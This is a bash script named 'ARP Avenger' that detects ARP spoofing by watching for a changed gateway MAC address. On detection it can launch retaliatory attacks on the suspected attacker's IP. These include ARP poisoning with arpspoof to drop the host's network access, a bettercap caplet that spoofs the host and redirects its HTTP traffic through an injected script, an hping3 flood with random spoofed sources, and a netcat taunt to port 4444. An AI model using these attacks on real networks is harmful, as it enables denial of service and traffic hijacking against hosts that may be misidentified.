#!/bin/bash
# ARP Avenger - Fiend's Wrath + Smart Detection
# Requires: arp-scan, arpspoof (dsniff), hping3, terminal-notifier, bettercap

### DEFAULT CONFIG ###
INTERFACE="en0"
SCAN_INTERVAL=10
MESSAGE="Stop ARP spoofing, asshole. You've been caught."

# Mode toggles
JUST_ALERT=true
SEND_MESSAGE=false
DROP_NETWORK=false
RICKROLL=false
FIRST_STRIKE=false
HPING_FLOOD=false

### FUNCTIONS ###
show_help() {
    cat <<EOF
ARP Avenger - Fiend's Wrath Edition with Smart Detection
Usage: $0 [options]

Options:
  --just-alert         Only notify (default: true)
  --send-message       Send revenge message to attacker
  --message "TEXT"     Set custom message text
  --drop-network       Drop attacker's network access
  --rickroll           Redirect attacker to Rickroll
  --first-strike       Immediate ARP nuke on attacker
  --hping-flood        Flood attacker with packets
  --interface enX      Set network interface (default: $INTERFACE)
  --interval SECONDS   Set scan interval (default: $SCAN_INTERVAL)
  --help               Show this help menu

Example:
  $0 --rickroll --send-message --message "Surprise, motherf****r"
EOF
}

cleanup() {
    echo -e "\n[*] Stopping all active attacks and exiting..."
    pkill -f arpspoof
    pkill -f hping3
    pkill -f bettercap
    exit 0
}
trap cleanup INT

get_network_fingerprint() {
    GATEWAY_IP=$(netstat -rn | awk '/default/ {print $2; exit}')
    GATEWAY_MAC=$(arp -n $GATEWAY_IP | awk '{print $4}')
    LOCAL_IP=$(ipconfig getifaddr "$INTERFACE")
    SUBNET=$(echo "$LOCAL_IP" | cut -d'.' -f1-3)
}

### PARSE ARGS ###
while [[ $# -gt 0 ]]; do
    case "$1" in
        --just-alert) JUST_ALERT=true ;;
        --send-message) SEND_MESSAGE=true ;;
        --message) MESSAGE="$2"; shift ;;
        --drop-network) DROP_NETWORK=true ;;
        --rickroll) RICKROLL=true ;;
        --first-strike) FIRST_STRIKE=true ;;
        --hping-flood) HPING_FLOOD=true ;;
        --interface) INTERFACE="$2"; shift ;;
        --interval) SCAN_INTERVAL="$2"; shift ;;
        --help) show_help; exit 0 ;;
        *) echo "Unknown option: $1"; show_help; exit 1 ;;
    esac
    shift
done

### INITIAL BASELINE ###
get_network_fingerprint
BASE_GATEWAY_IP="$GATEWAY_IP"
BASE_GATEWAY_MAC="$GATEWAY_MAC"
BASE_SUBNET="$SUBNET"

echo "[*] Starting ARP Avenger - Fiend's Wrath with Smart Detection on $INTERFACE"
echo "[*] Baseline network: Subnet=$BASE_SUBNET, Gateway IP=$BASE_GATEWAY_IP, Gateway MAC=$BASE_GATEWAY_MAC"
echo "[*] Press Ctrl+C to stop."

while true; do
    get_network_fingerprint

    # Check if network changed
    if [[ "$SUBNET" != "$BASE_SUBNET" || "$GATEWAY_IP" != "$BASE_GATEWAY_IP" ]]; then
        echo "[*] Network change detected. Re-baselining..."
        BASE_SUBNET="$SUBNET"
        BASE_GATEWAY_IP="$GATEWAY_IP"
        BASE_GATEWAY_MAC="$GATEWAY_MAC"
        echo "[*] New baseline: Subnet=$BASE_SUBNET, Gateway IP=$BASE_GATEWAY_IP, Gateway MAC=$BASE_GATEWAY_MAC"
        sleep $SCAN_INTERVAL
        continue
    fi

    # Same network, but MAC changed → Attack!
    if [[ "$GATEWAY_MAC" != "$BASE_GATEWAY_MAC" ]]; then
        echo "[!] Gateway MAC changed! Possible ARP spoof!"
        echo "Old MAC: $BASE_GATEWAY_MAC"
        echo "New MAC: $GATEWAY_MAC"

        ATTACKER_MAC="$GATEWAY_MAC"
        ATTACKER_IP=$(arp -an | grep "$ATTACKER_MAC" | awk '{print $2}' | sed 's/[()]//g')
        echo "[*] Attacker: IP=$ATTACKER_IP MAC=$ATTACKER_MAC"

        if [ "$JUST_ALERT" = true ]; then
            terminal-notifier -title "ARP Avenger Alert" -message "Gateway spoof from $ATTACKER_IP ($ATTACKER_MAC)"
        fi
        if [ "$DROP_NETWORK" = true ]; then
            echo "[*] Dropping network for $ATTACKER_MAC..."
            sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
        fi
        if [ "$SEND_MESSAGE" = true ]; then
            echo "[*] Sending revenge message..."
            echo "$MESSAGE" | nc -w 3 "$ATTACKER_IP" 4444
        fi
        if [ "$RICKROLL" = true ]; then
            echo "[*] Rickrolling $ATTACKER_IP..."
            RICKROLL_CAP="/tmp/rickroll_${ATTACKER_IP}.cap"
            cat > "$RICKROLL_CAP" <<EOF
set arp.spoof.targets $ATTACKER_IP
set arp.spoof.internal true
arp.spoof on
set http.server.address 0.0.0.0
set http.server.port 80
http.server on
set http.proxy.script /tmp/rickroll.js
http.proxy on
EOF
            cat > /tmp/rickroll.js <<EOF
function onRequest(req, res) {
    res.status = 302;
    res.headers["Location"] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    res.body = "";
    return res;
}
EOF
            sudo bettercap -iface "$INTERFACE" -caplet "$RICKROLL_CAP" >/dev/null 2>&1 &
        fi
        if [ "$FIRST_STRIKE" = true ]; then
            echo "[*] FIRST STRIKE: Nuking $ATTACKER_IP..."
            sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
        fi
        if [ "$HPING_FLOOD" = true ]; then
            echo "[*] Flooding $ATTACKER_IP..."
            sudo hping3 --flood --rand-source "$ATTACKER_IP" >/dev/null 2>&1 &
        fi
    fi

    sleep $SCAN_INTERVAL
done
